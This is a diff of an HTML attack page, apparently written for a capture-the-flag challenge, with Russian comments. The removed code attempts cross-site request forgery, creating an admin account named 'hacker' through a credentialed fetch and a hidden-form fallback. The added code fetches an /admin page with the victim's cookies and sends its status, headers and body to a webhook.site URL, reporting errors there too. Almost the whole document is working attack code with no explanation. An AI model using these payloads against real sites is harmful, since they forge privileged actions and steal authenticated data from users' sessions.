@@ -2,39 +2,67 @@
 <html>
 <body>
 <script>
-  // Попытка через fetch (может не сработать из-за SameSite)
-  fetch('http://tasks.goidactf.ru:20309/create_admin', {
-    method: 'POST',
+fetch('http://tasks.goidactf.ru:20061/admin', {
+    method: 'GET',
     credentials: 'include',
     headers: {
-      'Content-Type': 'application/x-www-form-urlencoded',
-      'Referer': 'http://tasks.goidactf.ru:20309/admin'
-    },
-    body: 'new_admin_login=hacker'
-  })
-  .then(r => r.text())
-  .then(html => {
-    // Успешно прочитали ответ → CORS открыт!
-    fetch('https://webhook.site/d7a1179b-eb8b-4901-801d-0afbed2f3741', {
-      method: 'POST', body: html
+        'Content-Type': 'application/json'
+    }
+})
+.then(response => {
+    // Получаем полный ответ от /admin
+    const status = response.status;
+    const headers = Object.fromEntries(response.headers.entries());
+    
+    return response.text().then(body => ({
+        status,
+        headers,
+        body
+    }));
+})
+.then(adminData => {
+    // Формируем данные для отправки на webhook
+    const payload = {
+        timestamp: new Date().toISOString(),
+        source: 'admin-request',
+        data: adminData
+    };
+    
+    // Отправляем данные на webhook.site
+    return fetch('https://webhook.site/d7a1179b-eb8b-4901-801d-0afbed2f3741', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(payload)
     });
-  })
-  .catch(e => {
-    // CORS закрыт — но запрос мог уйти!
-    // Всё равно пингани webhook
-    fetch('https://webhook.site/d7a1179b-eb8b-4901-801d-0afbed2f3741?error=' + encodeURIComponent(e.message));
-  });
-
-  // Дополнительно: надёжный fallback через форму
-  setTimeout(() => {
-    const f = document.createElement('form');
-    f.action = 'http://tasks.goidactf.ru:20309/create_admin';
-    f.method = 'POST';
-    f.innerHTML = '<input name="new_admin_login" value="hacker2">';
-    document.body.appendChild(f);
-    f.submit();
-    new Image().src = "https://webhook.site/d7a1179b-eb8b-4901-801d-0afbed2f3741?fallback_sent=1";
-  }, 1000);
+})
+.then(webhookResponse => {
+    if (webhookResponse.ok) {
+        console.log('✅ Данные успешно отправлены на webhook');
+        return webhookResponse.text();
+    } else {
+        throw new Error(`Webhook error: ${webhookResponse.status}`);
+    }
+})
+.then(webhookResult => {
+    console.log('Webhook response:', webhookResult);
+})
+.catch(error => {
+    console.error('❌ Ошибка:', error);
+    
+    // Пытаемся отправить информацию об ошибке на webhook
+    fetch('https://webhook.site/d7a1179b-eb8b-4901-801d-0afbed2f3741', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            timestamp: new Date().toISOString(),
+            error: error.toString()
+        })
+    }).catch(() => {});
+});
 </script>
 </body>
 </html>
